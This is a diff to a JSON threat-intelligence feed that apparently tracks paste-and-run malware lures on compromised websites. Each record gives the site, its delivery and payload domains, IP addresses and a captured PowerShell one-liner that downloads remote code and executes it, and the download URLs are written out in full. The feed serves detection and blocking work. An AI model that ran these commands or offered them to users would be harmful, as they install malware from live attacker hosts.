@@ -1,5 +1,86 @@
 [
   {
+    "UrlDomain": "lawishinteriordecoration.com",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/zaffsru9nl/b7b870665eb09f18"
+    ],
+    "IP": [
+      "91.108.98.78"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/zaffsru9nl/b7b870665eb09f18')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/zaffsru9nl/b7b870665eb09f18"
+    ],
+    "ReportId": "cmwy06ewh0g780omlgqj6ta51",
+    "ScannedAt": "2026-11-26T20:26:33.895000+00:00"
+  },
+  {
+    "UrlDomain": "www.graphicsking.unaux.com",
+    "DeliveryUrl": [],
+    "PayloadUrl": [
+      "https://loayardes.cc/saykatproliv1/29c18dfb82c90366?r=00448142",
+      "https://loayardes.cc/saykatproliv1/972a35da0c0d488a?r=52615579",
+      "https://loayardes.cc/saykatproliv1/56c6314d63de19d5?r=bf103822"
+    ],
+    "IP": [
+      "185.27.134.229"
+    ],
+    "Related": [
+      {
+        "Value": "fingerprint-veri.info",
+        "Type": "Discovered"
+      }
+    ],
+    "Payload": "powershell -w h \"iex(irm \\'fingerprint-veri[.]info/d8fc26fb3c8ae49a\\'); Start-Sleep -Seconds 30\"; exit",
+    "ResolvedDownloadUrl": [],
+    "ReportId": "cmwxzxe6v0fw30omliqif8ni7",
+    "ScannedAt": "2026-11-26T20:19:33.103000+00:00"
+  },
+  {
+    "UrlDomain": "dockandcourt.com",
+    "DeliveryUrl": [
+      "browse-login.info",
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/zaffsru9nl/f4067b9e6f78715e"
+    ],
+    "IP": [
+      "160.153.0.77"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/zaffsru9nl/f4067b9e6f78715e')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/zaffsru9nl/f4067b9e6f78715e"
+    ],
+    "ReportId": "cmwxzs7ov0fty0omll0s1pyq1",
+    "ScannedAt": "2026-11-26T20:15:31.345000+00:00"
+  },
+  {
+    "UrlDomain": "trevi.co.uk",
+    "DeliveryUrl": [],
+    "PayloadUrl": [],
+    "IP": [
+      "160.153.133.148"
+    ],
+    "Related": [
+      {
+        "Value": "gitlab.com",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "IRM gitlab[.]com/roza-1984y/6758f519-a0d7-4bf2-979d-776ccb798bd8/-/raw/main/44D483cA-0846-4A70-af30-62Bb86Fe4B12 | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gitlab.com/roza-1984y/6758f519-a0d7-4bf2-979d-776ccb798bd8/-/raw/main/44D483cA-0846-4A70-af30-62Bb86Fe4B12"
+    ],
+    "ReportId": "cmwxzqwn00fsp0omlt2fpw17t",
+    "ScannedAt": "2026-11-26T20:14:30.408000+00:00"
+  },
+  {
     "UrlDomain": "www.nytenymalagasy.com",
     "DeliveryUrl": [],
     "PayloadUrl": [],
@@ -11896,25 +11977,5 @@
     ],
     "ReportId": "cmwl5x2pj1hne0omlek9idizj",
     "ScannedAt": "2026-11-17T20:46:15.496000+00:00"
-  },
-  {
-    "UrlDomain": "coaching-center.net",
-    "DeliveryUrl": [],
-    "PayloadUrl": [],
-    "IP": [
-      "185.125.27.94"
-    ],
-    "Related": [
-      {
-        "Value": "gitlab.com",
-        "Type": "payload download"
-      }
-    ],
-    "Payload": "IRM gitlab[.]com/dsy648ajd6ff/01a1e287-8de7-700c-802a-969604d519c9/-/raw/main/01a1e287-8de7-700c-802a-9696051416d5 | IEX",
-    "ResolvedDownloadUrl": [
-      "https://gitlab.com/dsy648ajd6ff/01a1e287-8de7-700c-802a-969604d519c9/-/raw/main/01a1e287-8de7-700c-802a-9696051416d5"
-    ],
-    "ReportId": "cmwl4zs1d1hks0omly4w82bxw",
-    "ScannedAt": "2026-11-17T20:20:22.125000+00:00"
   }
 ]
